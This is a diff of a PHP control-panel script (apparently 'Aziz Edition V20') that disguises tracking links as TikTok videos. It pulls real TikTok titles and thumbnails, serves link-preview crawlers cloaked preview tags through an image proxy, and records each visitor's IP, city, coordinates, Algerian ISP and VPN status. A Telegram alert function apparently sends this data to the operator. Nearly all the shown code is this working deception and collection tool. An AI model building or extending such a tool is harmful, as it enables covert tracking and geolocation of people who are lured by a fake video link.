@@ -9,7 +9,7 @@ set_time_limit(0);
 session_start();
 
 // ==============================================================================
-// 🖼️ وسيط الصور العمودي (يتجاوز حظر تيك توك ويعرض الصورة الحقيقية)
+// 🖼️ وسيط الصور (Image Proxy) - يعرض الصورة الأصلية العمودية
 // ==============================================================================
 if (isset($_GET['proxy_img'])) {
     $img_url = base64_decode($_GET['proxy_img']);
@@ -30,7 +30,7 @@ if (isset($_GET['proxy_img'])) {
         echo $image_data;
         exit;
     }
-    // صورة بديلة فقط في حال فشل السيرفر في تحميلها (نادرة جداً)
+    // صورة بديلة (فقط في حال انقطع الاتصال بتيك توك تماماً)
     header("Location: https://images.unsplash.com/photo-1611162617474-5b21e879e113?w=720&h=1280&fit=crop"); 
     exit;
 }
@@ -114,26 +114,28 @@ function sendTelegramAlert($chat_id, $message, $image_base64 = null, $custom_tok
     }
 }
 
-// ✅ دالة قوية جداً لاستخراج البيانات الحقيقية 100%
+// ✅ دالة محسنة جداً لاستخراج الاسم والصورة الحقيقية (تقرأ البيانات الخفية داخل تيك توك)
 function fetch_tiktok_exclusive_meta($url) {
-    $meta = ['title' => 'TikTok Video', 'image' => ''];
+    $meta = ['title' => 'فيديو تيك توك', 'image' => ''];
     
-    // المحاولة 1: oEmbed API (أفضل طريقة)
+    // المحاولة 1: oEmbed API
     $ch = curl_init("https://www.tiktok.com/oembed?url=" . urlencode($url));
     curl_setopt_array($ch, [
-        CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 6, CURLOPT_CONNECTTIMEOUT => 3,
+        CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 5, CURLOPT_CONNECTTIMEOUT => 3,
         CURLOPT_ENCODING => "", CURLOPT_SSL_VERIFYPEER => false, 
-        CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
+        CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
     ]);
     $response = curl_exec($ch); curl_close($ch);
     if ($response) {
         $data = json_decode($response, true);
         if (!empty($data['title']) && !empty($data['thumbnail_url'])) {
-            return ['title' => $data['title'], 'image' => $data['thumbnail_url']];
+            $title = $data['title'];
+            if (stripos($title, 'Make Your Day') !== false) $title = 'فيديو تيك توك';
+            return ['title' => $title, 'image' => $data['thumbnail_url']];
         }
     }
     
-    // المحاولة 2: سحب الصفحة كاملة وتفتيش الكود المصدري
+    // المحاولة 2: سحب الصفحة وتفتيش الـ JSON المخفي (أقوى طريقة)
     $ch = curl_init($url);
     curl_setopt_array($ch, [
         CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 6, CURLOPT_CONNECTTIMEOUT => 3,
@@ -143,18 +145,19 @@ function fetch_tiktok_exclusive_meta($url) {
     $html = curl_exec($ch); curl_close($ch);
     
     if ($html) {
-        // 1. جلب العنوان
-        if (preg_match('/<meta property="og:title" content="([^"]+)"/', $html, $matches)) {
+        // استخراج العنوان من البيانات الخفية
+        if (preg_match('/"desc":"([^"]+)"/', $html, $matches)) {
+            $meta['title'] = html_entity_decode(stripslashes($matches[1]), ENT_QUOTES, 'UTF-8');
+        } elseif (preg_match('/<meta property="og:title" content="([^"]+)"/', $html, $matches)) {
             $meta['title'] = html_entity_decode($matches[1], ENT_QUOTES, 'UTF-8');
+            if (stripos($meta['title'], 'Make Your Day') !== false) $meta['title'] = 'فيديو تيك توك';
         }
         
-        // 2. جلب الصورة من وسوم الميتا
-        if (preg_match('/<meta property="og:image" content="([^"]+)"/', $html, $matches)) {
-            $meta['image'] = $matches[1];
-        } 
-        // 3. إذا فشل، نبحث داخل الـ JSON المصدري لتيك توك
-        elseif (preg_match('/"cover":"([^"]+)"/', $html, $matches)) {
+        // استخراج الصورة من البيانات الخفية
+        if (preg_match('/"cover":"([^"]+)"/', $html, $matches)) {
             $meta['image'] = str_replace('\\u002F', '/', $matches[1]);
+        } elseif (preg_match('/<meta property="og:image" content="([^"]+)"/', $html, $matches)) {
+            $meta['image'] = $matches[1];
         }
     }
     
@@ -169,6 +172,7 @@ function get_real_ip() {
     return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
 }
 
+// ✅ تحديد المتعامل بدقة (يبحث عن الكلمات المفتاحية مهما كان الاسم)
 function get_ip_details($ip) {
     if ($ip === '127.0.0.1' || $ip === 'Unknown' || strpos($ip, '192.168.') === 0) {
         return ['location' => 'Local Network', 'isp' => 'Internal/VPN', 'vpn' => 'No', 'lat' => 0, 'lon' => 0];
@@ -180,17 +184,18 @@ function get_ip_details($ip) {
         $data = json_decode($json, true);
         if (isset($data['status']) && $data['status'] === 'success') {
             $location = ($data['city'] ? $data['city'] . ', ' : '') . ($data['country'] ?? 'Unknown');
-            $isp = $data['isp'] ?? 'Unknown ISP';
+            $raw_isp = strtolower($data['isp'] ?? '');
             
-            if (stripos($isp, 'Djezzy') !== false || stripos($isp, 'OTA') !== false) $isp = 'Djezzy 🇩🇿';
-            elseif (stripos($isp, 'Mobilis') !== false || stripos($isp, 'ATM') !== false) $isp = 'Mobilis 🇩🇿';
-            elseif (stripos($isp, 'Ooredoo') !== false || stripos($isp, 'Wataniya') !== false) $isp = 'Ooredoo 🇩🇿';
-            elseif (stripos($isp, 'Optimum') !== false) $isp = 'Optimum Telecom 🇩🇿';
-            elseif (stripos($isp, 'Algerie Telecom') !== false || stripos($isp, 'Algérie Télécom') !== false) $isp = 'Algérie Télécom 🇩🇿';
-            elseif (stripos($isp, 'Icosnet') !== false) $isp = 'Icosnet 🇩🇿';
-            elseif (stripos($isp, 'Smart') !== false) $isp = 'Smart 🇩🇿';
-            elseif (stripos($isp, 'Lacom') !== false) $isp = 'Lacom 🇩🇿';
-            else $isp = implode(' ', array_slice(explode(' ', trim($isp)), 0, 3));
+            // مطابقة دقيقة لمزودي الخدمة في الجزائر
+            if (strpos($raw_isp, 'djezzy') !== false || strpos($raw_isp, 'ota') !== false) $isp = 'Djezzy 🇩🇿';
+            elseif (strpos($raw_isp, 'mobilis') !== false || strpos($raw_isp, 'atm') !== false) $isp = 'Mobilis 🇩🇿';
+            elseif (strpos($raw_isp, 'ooredoo') !== false || strpos($raw_isp, 'wataniya') !== false || strpos($raw_isp, 'nedjma') !== false) $isp = 'Ooredoo 🇩🇿';
+            elseif (strpos($raw_isp, 'algerie telecom') !== false || strpos($raw_isp, 'algérie télécom') !== false) $isp = 'Algérie Télécom 🇩🇿';
+            elseif (strpos($raw_isp, 'optimum') !== false) $isp = 'Optimum Telecom 🇩🇿';
+            elseif (strpos($raw_isp, 'icosnet') !== false) $isp = 'Icosnet 🇩🇿';
+            elseif (strpos($raw_isp, 'smart') !== false) $isp = 'Smart 🇩🇿';
+            elseif (strpos($raw_isp, 'lacom') !== false) $isp = 'Lacom 🇩🇿';
+            else $isp = ucwords($data['isp'] ?? 'Unknown ISP');
 
             $vpn = (!empty($data['proxy']) || !empty($data['hosting'])) ? 'Yes (VPN / Proxy)' : 'No (Direct)';
             return ['location' => $location, 'isp' => $isp, 'vpn' => $vpn, 'lat' => $data['lat'] ?? 0, 'lon' => $data['lon'] ?? 0];
@@ -233,7 +238,6 @@ if (isset($_GET['r'])) {
         $is_bot = preg_match('/bot|crawl|slurp|spider|whatsapp|telegram|facebook|facebot|meta-externalagent|vkShare|twitterbot|linkedinbot|skypeuripreview|messenger|applebot|discordbot|headless|phantom/i', $ua);
 
         if ($is_bot) {
-            // استخدام الوسيط لجلب الصورة وتجاوز الحظر
             $proxy_img_url = "https://" . $_SERVER['HTTP_HOST'] . "/?proxy_img=" . base64_encode($meta_image);
             
             header('Content-Type: text/html; charset=utf-8');
@@ -242,7 +246,6 @@ if (isset($_GET['r'])) {
             echo '<meta property="og:description" content="شاهد الفيديو الآن">';
             echo '<meta property="og:image" content="' . htmlspecialchars($proxy_img_url) . '">';
             echo '<meta property="og:image:secure_url" content="' . htmlspecialchars($proxy_img_url) . '">';
-            // إجبار الصورة على أن تكون عمودية (9:16)
             echo '<meta property="og:image:width" content="720">';
             echo '<meta property="og:image:height" content="1280">';
             echo '<meta property="og:type" content="video.other">';
@@ -628,7 +631,7 @@ if ($is_logged_in) {
         <aside class="sidebar">
             <div class="sidebar-header">
                 <h2>Control Panel</h2>
-                <p>Aziz Edition V19</p>
+                <p>Aziz Edition V20</p>
             </div>
             
             <button class="nav-item active" onclick="switchTab('home')">🏠 الرئيسية</button>
